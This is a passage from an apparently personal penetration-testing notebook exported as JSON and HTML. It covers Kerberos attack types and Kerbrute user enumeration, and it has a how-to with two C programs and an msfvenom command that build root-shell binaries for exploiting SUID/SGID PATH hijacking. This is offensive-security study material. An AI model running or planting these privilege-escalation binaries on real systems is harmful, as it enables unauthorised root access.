Key&lt;/em&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;AP-REP: The service server decrypts the service ticket (message E) using its long term secret key to retrieve the &lt;em&gt;Client/Server Session Key&lt;/em&gt;. Using the sessions key, it then decrypts the Authenticator and compares client ID from the service ticket and message G. If they match the server sends the following message to the client to confirm its true identity and willingness to serve the client:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Message H: The timestamp found in client’s Authenticator (sometimes modified, depending upon the version of Kerberos being used), encrypted using the &lt;em&gt;Client/Server Session Key&lt;/em&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;The client decrypts the confirmation (message H) using the &lt;em&gt;Client/Server Session Key&lt;/em&gt; and checks whether the timestamp is correct. If so, then the client can trust the server and can start issuing service requests to the server.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;The server provides the requested services to the client.&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#exploitation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;kirbi-files&quot;&gt;.kirbi files&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#kirbi-files&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;There’s a bit of terminology creep when discussing Kerberos tickets. &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Mimikatz&quot;&gt;Mimikatz&lt;/a&gt; and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Rubeus&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Rubeus&quot;&gt;Rubeus&lt;/a&gt; are actually dumping Kerberos data structures (as .kirbi files), which contain &lt;em&gt;both&lt;/em&gt; a ticket &lt;em&gt;and&lt;/em&gt; the corresponding session key. People tend to call these .kirbi files “tickets”, but it’s worth keeping in mind that they contain &lt;em&gt;both&lt;/em&gt; pieces of data (as a “ticket” in the Kerberos sense, not the hacker’s sense, isn’t useful without the corresponding session key).&lt;/p&gt;\n&lt;h3 id=&quot;kerberoasting&quot;&gt;Kerberoasting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#kerberoasting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Kerberoasting&quot; data-block=&quot;&quot; data-embed-alias=&quot;Kerberoasting&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberoasting&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Kerberoasting&quot;&gt;Transclude of Kerberoasting&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h3 id=&quot;as-rep-roasting&quot;&gt;AS-REP roasting&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#as-rep-roasting&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;AS-REP-roasting&quot; data-block=&quot;&quot; data-embed-alias=&quot;AS-REP roasting&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/AS-REP-roasting&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/AS-REP-roasting&quot;&gt;Transclude of AS-REP-roasting&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h3 id=&quot;pass-the-ticket-attacks&quot;&gt;Pass the ticket attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#pass-the-ticket-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The only real way to defend against this attack is to &lt;em&gt;only&lt;/em&gt; allow domain admins to log into domain controllers, &lt;em&gt;not&lt;/em&gt; lower privileged machines!&lt;/p&gt;\n&lt;h3 id=&quot;goldensilver-ticket-attacks&quot;&gt;Golden/silver ticket attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#goldensilver-ticket-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Golden-and-silver-ticket-attacks&quot; data-block=&quot;&quot; data-embed-alias=&quot;Golden and silver ticket attacks&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Golden-and-silver-ticket-attacks&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Golden-and-silver-ticket-attacks&quot;&gt;Transclude of Golden-and-silver-ticket-attacks&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Kerbrute":{"slug":"spells/Kerbrute","filePath":"spells/Kerbrute.md","title":"Kerbrute","links":["spells/UDP"],"tags":["Protocol/Kerberos","Protocol/UDP","OS/Windows/ActiveDirectory","Application/Kerbrute","AttackCycle/Reconnaissance/BruteForcing"],"content":"Kerbrute user enumeration works by sending a single UDP packet to the authentication service to begin the authentication process, but then doesn’t complete the transaction as to avoid an actual login failure (and the associated logging). While this doesn’t grant access to anything, it does allow domain users to be enumerated using a wordlist.\nTo use Kerbrute you need to meet one of the following requirements:\n\nAlready be on the domain you are attacking, or\nKnow the IP address of the domain controller (which normally hosts the KDC). This can be manually mapped in /etc/hosts or just specified as a raw IP using the --dc flag.\n","richContent":"&lt;p&gt;Kerbrute user enumeration works by sending a single &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; packet to the authentication service to begin the authentication process, but then doesn’t complete the transaction as to avoid an actual login failure (and the associated logging). While this doesn’t grant access to anything, it does allow domain users to be enumerated using a wordlist.&lt;/p&gt;\n&lt;p&gt;To use Kerbrute you need to meet one of the following requirements:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;Already be on the domain you are attacking, &lt;em&gt;or&lt;/em&gt;&lt;/li&gt;\n&lt;li&gt;Know the IP address of the domain controller (which normally hosts the KDC). This can be manually mapped in /etc/hosts or just specified as a raw IP using the &lt;code&gt;--dc&lt;/code&gt; flag.&lt;/li&gt;\n&lt;/ol&gt;"},"spells/Load-a-shell-with-a-simple-executable":{"slug":"spells/Load-a-shell-with-a-simple-executable","filePath":"spells/Load a shell with a simple executable.md","title":"Load a shell with a simple executable","links":["spells/Exploit-LD_PRELOAD","spells/Avoid-dropping-privileges-with-SUID-Bash","spells/msfvenom"],"tags":["HowTo","AttackCycle/Exploitation","Application/Metasploit/msfvenom","Language/Bash"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_QuickCShell.\n\n\n\nIt’s actually trivial to write a C program that loads up a shell.\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n \nmain() {\n\tsetuid(0);\n\tsetgid(0);\n\texecl(&quot;/bin/bash&quot;,\n\t      &quot;/bin/bash&quot;,\n\t      &quot;-p&quot;,\n\t      (char*) NULL);\n}\nAlternate approach:\n#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n \nmain() {\n\tsetresuid(0, 0, 0);\n\tsetregid(0, 0, 0);\n\tsystem(&quot;/bin/bash -p&quot;);\n\treturn 0;\n}\nCompile with:\ngcc -fPIC -o /path/to/malicious /path/to/malicious.c\nNote that this is almost identical to the LD_PRELOAD trick; the primary differences are:\n\nUse main() instead of _init() as our entry point.\nCompile without -shared and -nostartfiles.\n\nA simple binary like this is useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control.\n\n\n                  \n                  Tip\n                  \n                \n\n\nRemember that the -p flag is required to keep Bash from dropping privileges!\n\n\n\nUsing Metasploit\nMetasploit’s msfvenom tool can generate binaries that launch any command as root (useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control).\nmsfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf \\\n         -o shell.elf\n\n\n                  \n                  Tip\n                  \n                \n\n\nRemember that the -p flag is required to keep Bash from dropping privileges!\n\n\n","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_QuickCShell&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_QuickCShell&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;It’s actually trivial to write a C program that loads up a shell.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdio.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;unistd.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;main&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsetuid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsetgid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\texecl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t      &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t      &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t      (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; NULL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Alternate approach:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;c&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;stdio.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;include&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;time.h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;main&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsetresuid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsetregid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\treturn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Compile with:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gcc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -fPIC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/malicious&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /path/to/malicious.c&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that this is &lt;em&gt;almost&lt;/em&gt; identical to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-LD_PRELOAD&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-LD_PRELOAD&quot;&gt;the LD_PRELOAD trick&lt;/a&gt;; the primary differences are:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Use &lt;code&gt;main()&lt;/code&gt; instead of &lt;code&gt;_init()&lt;/code&gt; as our entry point.&lt;/li&gt;\n&lt;li&gt;Compile without &lt;code&gt;-shared&lt;/code&gt; and &lt;code&gt;-nostartfiles&lt;/code&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;A simple binary like this is useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control.&lt;/p&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Avoid-dropping-privileges-with-SUID-Bash&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Avoid-dropping-privileges-with-SUID-Bash&quot;&gt;Remember that the -p flag is required to keep Bash from dropping privileges!&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;using-metasploit&quot;&gt;Using Metasploit&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#using-metasploit&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Metasploit’s &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt; tool can generate binaries that launch any command as root (useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;msfvenom&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; linux/x86/exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; CMD=&lt;/span&gt;&lt;span 